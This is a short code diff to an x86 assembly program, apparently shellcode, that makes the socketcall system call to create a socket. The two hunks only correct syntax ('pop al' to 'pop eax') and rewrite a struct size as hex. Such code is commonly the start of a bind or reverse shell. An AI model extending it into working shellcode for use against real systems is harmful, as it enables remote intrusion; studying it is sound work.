@@ -33,7 +33,7 @@ _start:
 
 	; syscall 102 in eax
 	push byte 0x66
- 	pop al
+ 	pop eax
 
 	; 1 in ebx for type of socketcall
 	xor ebx, ebx
@@ -75,7 +75,7 @@ _start:
 	mov ecx, esp
 
  	; Push the sizeof arg array
-	push byte 16
+	push byte 0x10
 
 	; Push the struct pointer
 	push ecx
